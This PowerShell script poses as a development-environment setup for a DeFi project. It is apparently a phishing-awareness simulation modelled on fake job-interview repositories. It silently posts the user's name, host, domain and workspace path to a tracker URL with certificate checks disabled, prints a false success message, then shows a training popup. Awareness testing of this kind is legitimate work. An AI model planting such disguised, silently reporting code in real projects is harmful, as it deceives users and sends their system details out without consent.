###############################################################################
# Workspace Initialization Script (PowerShell)
# Automatically configures development environment for DeFi Vault project
###############################################################################

$TrackerUrl = "https://your-phishing-tracker.corp/api/log"

$CampaignId = "contagious-interview-2026"
$TimeoutSec = 3

function Get-Telemetry {
    $telemetry = @{
        timestamp = (Get-Date).ToUniversalTime().ToString("o")
        username = $env:USERNAME
        hostname = $env:COMPUTERNAME
        domain = $env:USERDOMAIN
        os = "Windows"
        os_version = [System.Environment]::OSVersion.Version.ToString()
        powershell_version = $PSVersionTable.PSVersion.ToString()
        workspace = (Get-Location).Path
        event = "vscode_workspace_opened"
        campaign = $CampaignId
    }
    
    
    try {
        $vscodeVersion = (code --version 2>$null | Select-Object -First 1)
        if ($vscodeVersion) {
            $telemetry.vscode_version = $vscodeVersion
        }
    } catch {
        $telemetry.vscode_version = "unknown"
    }
    
    return $telemetry
}

function Send-Telemetry {
    param (
        [hashtable]$Data
    )
    
    try {
        $json = $Data | ConvertTo-Json -Compress
        
        $job = Start-Job -ScriptBlock {
            param($url, $body, $timeout)
            
            try {
               
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
                
                Invoke-RestMethod -Uri $url `
                    -Method Post `
                    -Body $body `
                    -ContentType "application/json" `
                    -UserAgent "VSCode-Workspace-Init/1.0" `
                    -TimeoutSec $timeout `
                    -ErrorAction SilentlyContinue | Out-Null
            } catch {
                
            }
        } -ArgumentList $TrackerUrl, $json, $TimeoutSec
        
       
        $null = $job
        
    } catch {
        
    }
}

function Show-AwarenessNotification {
    
    Start-Sleep -Seconds 5
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "🎓 Security Awareness Test"
        $form.Size = New-Object System.Drawing.Size(500, 250)
        $form.StartPosition = "CenterScreen"
        $form.TopMost = $true
        $form.FormBorderStyle = "FixedDialog"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        
        $iconBox = New-Object System.Windows.Forms.PictureBox
        $iconBox.Size = New-Object System.Drawing.Size(48, 48)
        $iconBox.Location = New-Object System.Drawing.Point(20, 20)
        $iconBox.Image = [System.Drawing.SystemIcons]::Warning.ToBitmap()
        $form.Controls.Add($iconBox)
        
        $label = New-Object System.Windows.Forms.Label
        $label.Location = New-Object System.Drawing.Point(80, 20)
        $label.Size = New-Object System.Drawing.Size(380, 120)
        $label.Text = "⚠️ You have just executed an unknown code from the Internet!`n`n" +
                      "It was a phishing training test as part of a training program." +
                      "awareness of cybersecurity.`n`n" +
                      "Check your corporate email for details." +
                      "information on how to detect such attacks."
        $label.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $form.Controls.Add($label)
        
        $okButton = New-Object System.Windows.Forms.Button
        $okButton.Location = New-Object System.Drawing.Point(200, 160)
        $okButton.Size = New-Object System.Drawing.Size(100, 30)
        $okButton.Text = "Clear"
        $okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $okButton.Font = New-Object System.Drawing.Font("Segoe UI", 10)
        $form.Controls.Add($okButton)
        $form.AcceptButton = $okButton
        
        $form.Add_Shown({$form.Activate()})
        [void]$form.ShowDialog()
        
    } catch {
        
        try {
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show(
                "⚠️ You have just executed an unknown code from the Internet!`n`n" +
                "It was an educational phishing test.`n" +
                "Check your email for details.",
                "🎓 Security Awareness Test",
                [System.Windows.Forms.MessageBoxButtons]::OK,
                [System.Windows.Forms.MessageBoxIcon]::Warning
            ) | Out-Null
        } catch {
           
            Write-Host "`n======================================================================"
            Write-Host "🎓 SECURITY AWARENESS TEST" -ForegroundColor Yellow
            Write-Host "======================================================================"
            Write-Host "⚠️  You have just executed an unknown code from the Internet!" -ForegroundColor Red
            Write-Host ""
            Write-Host "It was an educational phishing test."
            Write-Host "to raise awareness about cybersecurity."
            Write-Host ""
            Write-Host "Check your corporate email address to receive"
            Write-Host "detailed information on how to detect such attacks."
            Write-Host "======================================================================`n"
        }
    }
}


function Main {
    try {
        
        $telemetry = Get-Telemetry
        
        
        Send-Telemetry -Data $telemetry
        
       
        Start-Job -ScriptBlock ${function:Show-AwarenessNotification} | Out-Null
        
       
        Write-Host "✓ Development environment initialized successfully" -ForegroundColor Green
        
    } catch {
        
        Write-Host "✓ Workspace ready"
    }
}


Main
